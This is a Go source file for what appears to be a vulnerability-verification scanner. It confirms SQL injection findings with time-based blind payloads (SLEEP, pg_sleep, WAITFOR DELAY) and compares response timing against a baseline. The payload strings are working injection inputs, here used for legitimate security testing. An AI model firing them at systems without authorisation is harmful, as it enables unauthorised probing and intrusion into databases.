package verify

import (
	"net/http"
	"time"
)

// sqliSleep is the DB pause the payloads request. It is a var so tests can
// shrink it; real runs use the default.
var sqliSleep = 5 * time.Second

// sqliPayloads are time-based blind payloads across common engines; each makes
// a vulnerable backend pause ~sqliSleep. The oracle is the timing delta, so no
// reflected output is needed (works for fully-blind injection).
func sqliPayloads() []string {
	return []string{
		"1' AND SLEEP(5)-- -",                      // MySQL
		"1'; SELECT pg_sleep(5)-- -",               // PostgreSQL
		"1' AND 1=(SELECT 1 FROM PG_SLEEP(5))-- -", // PostgreSQL (boolean-wrapped)
		"1 WAITFOR DELAY '0:0:5'-- -",              // MSSQL
	}
}

// SQLiProbe verifies SQL injection via time-based blind technique:
// measure a baseline latency, then a sleep-injected latency; a delta near the
// requested sleep (confirmed twice) means the payload reached the SQL engine.
type SQLiProbe struct{}

func (SQLiProbe) Kind() string { return "sqli" }

func (SQLiProbe) Plan(f Finding, _ string) Plan {
	return Plan{Summary: methodOf(f) + " " + f.Target +
		"  [" + f.Param + " = time-based payloads: SLEEP / pg_sleep / WAITFOR]"}
}

func (p SQLiProbe) Execute(f Finding, env *Env) Result {
	r := Result{}

	// Baseline: benign value; take the faster of two to be conservative.
	base, ok := p.timeOnce(f, env, "1")
	if !ok {
		r.Evidence = "baseline request failed (inconclusive)"
		return r
	}
	if b2, ok2 := p.timeOnce(f, env, "1"); ok2 && b2 < base {
		base = b2
	}

	threshold := time.Duration(float64(sqliSleep) * 0.6)

	for _, payload := range sqliPayloads() {
		d, ok := p.timeOnce(f, env, payload)
		if !ok || d-base < threshold {
			continue
		}
		// Re-fire to reject a one-off slow response (reduce false positive).
		if d2, ok2 := p.timeOnce(f, env, payload); ok2 && d2-base >= threshold {
			r.Confirmed = true
			r.Evidence = "time-based: baseline≈" + base.Round(time.Millisecond).String() +
				", injected≈" + d.Round(time.Millisecond).String() +
				" (Δ ≥ " + threshold.Round(time.Millisecond).String() + ") via: " + payload
			return r
		}
	}
	r.Refuted = true
	r.Evidence = "no payload delayed the response ≥ threshold over baseline ≈" +
		base.Round(time.Millisecond).String()
	return r
}

// timeOnce sends one request with param=value and returns elapsed wall time.
func (SQLiProbe) timeOnce(f Finding, env *Env, value string) (time.Duration, bool) {
	u, err := buildURL(f, f.Param, value)
	if err != nil {
		return 0, false
	}
	req, err := http.NewRequest(methodOf(f), u, nil)
	if err != nil {
		return 0, false
	}
	applyHeaders(req, f)
	start := time.Now()
	if _, _, err := env.do(req); err != nil {
		return 0, false
	}
	return time.Since(start), true
}

func init() { Register(SQLiProbe{}) }
